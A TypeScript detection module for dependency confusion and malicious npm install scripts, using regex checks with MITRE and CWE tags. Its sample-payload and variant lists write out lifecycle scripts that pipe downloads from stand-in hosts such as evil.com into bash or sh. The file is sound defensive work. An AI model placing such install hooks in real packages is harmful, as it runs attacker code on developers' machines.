/**
 * dependency-hijacking — dependency confusion and lifecycle script abuse
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'
import { safeRegexMatchAll, safeRegexTest } from './regex-safety.js'

const QUOTED_KEY_VALUE_RE = /"([^"\n]+)"\s*:\s*"([^"]*)"/g
const REQUIREMENT_ENTRY_RE = /^\s*(@?(?:internal|corp|company-private)[a-zA-Z0-9._/-]*|[a-zA-Z0-9._-]+)\s*(>=|==|<=|~=|=)\s*(\d+\.\d+\.\d+)/gim
const NAMED_VERSION_RE = /(@(?:internal|corp|company-private)\/[A-Za-z0-9._-]+)\s+version\s+(\d+\.\d+\.\d+)/i
const TYPO_PACKAGE_RE = /\b@(?:internal|corp|company-private)\b/i
const PUBLIC_REGISTRY_RE = /(?:\bhttps?:\/\/)?(?:registry\.npmjs\.org|pypi\.org)/i
const SCRIPT_RE = /"(?<name>preinstall|install|postinstall)"\s*:\s*"(?<body>(?:[^"\\]|\\.)*)"/gi
const SCRIPT_TEXT_RE = /\b(?<name>preinstall|install|postinstall)\s*:\s*(?<body>[^;\n\r,{}]+)/gi

const INTERNAL_PACKAGE_PREFIX_RE = /^@(?:internal|corp|company-private)\//i

const quotedKeyValues = (input: string): Array<{ name: string; value: string }> => {
    const values: Array<{ name: string; value: string }> = []
    const matches = safeRegexMatchAll(QUOTED_KEY_VALUE_RE, input) ?? []
    for (const match of matches) {
        const name = (match[1] ?? '').trim()
        const value = (match[2] ?? '').trim()
        if (name && value !== undefined) values.push({ name, value })
    }
    return values
}

const isInternalPackageName = (name: string): boolean => {
    const normalized = name.toLowerCase()
    return INTERNAL_PACKAGE_PREFIX_RE.test(normalized) || /\b(?:internal|corp|company-private)\b/i.test(normalized)
}

const hasInternalPackageInManifest = (decoded: string): boolean => {
    if (!TYPO_PACKAGE_RE.test(decoded)) return false

    const values = quotedKeyValues(decoded)
    if (values.length === 0) return false

    return values.some(({ name }) => isInternalPackageName(name))
}

const hasSuspiciousInternalVersionSpec = (decoded: string): boolean => {
    const matches = safeRegexMatchAll(REQUIREMENT_ENTRY_RE, decoded) ?? []
    for (const match of matches) {
        const name = (match[1] ?? '').toLowerCase()
        const operator = (match[2] ?? '')
        const version = (match[3] ?? '')
        if (!isInternalPackageName(name)) continue
        if (operator === '>=' && /^0\.0\.1$/.test(version)) return true
    }

    if (safeRegexTest(NAMED_VERSION_RE, decoded)) return true

    return false
}

const hasMaliciousLifecycleScript = (decoded: string): boolean => {
    const scriptMatches = safeRegexMatchAll(SCRIPT_RE, decoded) ?? []
    for (const match of scriptMatches) {
        const body = ((match.groups as { body?: string } | undefined)?.body ?? '').toLowerCase()
        if (!body) continue

        if (/(?:curl|wget)\b/.test(body) && /\|/.test(body)) return true
        if (/\bfetch\s*\(/.test(body)) return true
        if (/\bnode\s+-e\b/.test(body) && /require\(/.test(body)) return true
        if (/\b(sh|bash)\b/.test(body) && /[-#\s]c\s+/.test(body)) return true
        if (/\b(sh|bash|node|python|powershell)\b/.test(body) && /(?:;|&&|\|\||&&)/.test(body)) return true
    }

    const textMatches = safeRegexMatchAll(SCRIPT_TEXT_RE, decoded) ?? []
    for (const match of textMatches) {
        const body = (match.groups as { body?: string } | undefined)?.body?.toLowerCase().replace(/^["']|["']$/g, '').trim()
        if (!body) continue

        if (/(?:curl|wget)\b/.test(body) && /\|/.test(body)) return true
        if (/\bfetch\s*\(/.test(body)) return true
        if (/\bnode\s+-e\b/.test(body) && /require\(/.test(body)) return true
        if (/\b(sh|bash)\b/.test(body) && /[-#\s]c\s+/.test(body)) return true
        if (/\b(sh|bash|node|python|powershell)\b/.test(body) && /(?:;|&&|\|\||&&)/.test(body)) return true
    }

    return false
}

export const dependencyHijacking: InvariantClassModule = {
    id: 'dependency_hijacking',
    description: 'Dependency hijacking via internal namespace typosquatting and unsafe lifecycle scripts',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },

    mitre: ['T1195.001'],
    cwe: 'CWE-1357',

    knownPayloads: [
        'postinstall: curl http://evil.com | bash',
        'preinstall: wget https://c2.evil/payload -O - | sh',
        'install: node -e "require(http)..."',
        '@internal/auth-utils version 99.0.0',
        'scripts: {postinstall: "curl evil.com | sh"}',
    ],

    knownBenign: [
        'postinstall: echo done',
        'npm install lodash',
        'yarn add react',
        'pip install requests',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)

        if (hasInternalPackageInManifest(d)) return true
        if (hasSuspiciousInternalVersionSpec(d)) return true
        if (safeRegexTest(PUBLIC_REGISTRY_RE, d) && hasInternalPackageInManifest(d)) return true
        if (hasMaliciousLifecycleScript(d)) return true

        return false
    },

    generateVariants: (count: number): string[] => {
        const variants = [
            'postinstall: curl http://evil.com | bash',
            'preinstall: wget https://c2.evil/payload -O - | sh',
            'install: node -e "require(http)..."',
            '@internal/auth-utils version 99.0.0',
            'scripts: {postinstall: "curl evil.com | sh"}',
        ]

        return variants.slice(0, count)
    },
}
